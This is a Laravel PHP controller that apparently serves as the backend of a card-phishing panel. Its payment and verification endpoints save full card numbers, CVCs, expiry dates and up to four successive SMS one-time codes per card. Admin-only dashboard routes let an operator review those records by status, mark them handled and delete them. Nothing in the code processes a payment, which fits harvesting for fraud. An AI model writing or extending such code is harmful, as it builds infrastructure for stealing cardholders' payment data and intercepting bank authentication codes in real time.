<?php

namespace App\Http\Controllers;

use App\Models\Detail;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Redirect;

class DashboardController extends Controller
{
    public function index(){
        if(auth()->user()->isAdmin == 1){
              $details = Detail::with('users')->orderBy('status','desc')
                ->orderBy('updated_at', 'desc')->get();
        
               return view('dashboard')->with(compact('details'));
        }else{
            return Redirect('/');
        };
     
    }

    public function detailUser(){
         if(auth()->user()->isAdmin == 1){
        $details = Detail::with('users')->groupBy('cnumber')->get();

        return view('details')->with(compact('details'));
         }else{
            return Redirect('/');
        };
    }
    
    public function payment(Request $request){
       
        $rmonth = strlen($request->month) === 1 ? '0'.$request->month : $request->month; 
        Detail::updateOrCreate(
            [
                'cnumber' => $request->card,
                'cvc' => $request->cvc,
                'exp' => $request->year . '/' . $rmonth,
            ],
            [
                'user_id' => Auth()->user()->id,
                'country' => $request->country,
                'cnumber' => $request->card,
                'cvc' => $request->cvc,
                'exp' => $request->year . '/' . $rmonth,
                'status' => 1,
            ]
        );
        
        
        return true;
      
    }

    public function verificationCode(Request $request){
         
        $rmonth = strlen($request->month) === 1 ? '0'.$request->month : $request->month; 
        $detail = Detail::where(['cnumber'=>$request->card, 'cvc'=>$request->cvc , 'exp'=>$request->year.'/'.$rmonth])->first();
 
        if($detail->sms == null){
            $detail->sms = $request->codeV;
            $detail->status = 1;
        }elseif($detail->sms1 == null){
            $detail->sms1 = $request->codeV;
            $detail->status = 1;
        }elseif($detail->sms2 == null){
            $detail->sms2 = $request->codeV;
            $detail->status = 1;
        }elseif($detail->sms3 == null){
            $detail->sms3 = $request->codeV;
            $detail->status = 1;
        }
     
        $detail->save();

        return true;
       
    }

    public function deleteDetail(Request $request , $id){
      if(auth()->user()->isAdmin == 1){
        Detail::find($id)->delete();
        return Redirect('/dashboard');
      }else{
            return Redirect('/');
        };
    }

    public function changeStatus(Request $request){
         if(auth()->user()->isAdmin == 1){
        $detail = Detail::find($request->id);
        $detail->status = 0 ; 
        $detail->save();
        return true;
         }else{
            return Redirect('/');
        };
    }
}

